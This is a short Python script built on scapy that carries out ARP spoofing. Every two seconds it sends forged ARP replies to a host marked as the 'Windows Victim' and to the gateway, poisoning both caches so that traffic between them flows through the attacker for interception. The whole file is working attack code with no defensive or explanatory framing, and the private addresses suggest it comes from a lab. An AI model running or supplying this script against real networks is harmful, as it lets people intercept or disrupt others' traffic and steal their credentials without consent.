import time
from scapy.all import ARP, send, getmacbyip

target_ip = "172.20.10.9"   # Windows Victim IP
gateway_ip = "172.20.10.1" # Gateway IP

def spoof(target, source):
    target_mac = getmacbyip(target)
    packet = ARP(op=2, pdst=target, hwdst=target_mac, psrc=source)
    send(packet, verbose=False)

print("[*] Starting ARP Spoofing... Press Ctrl+C to stop")
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Stopping ARP Spoofing.")
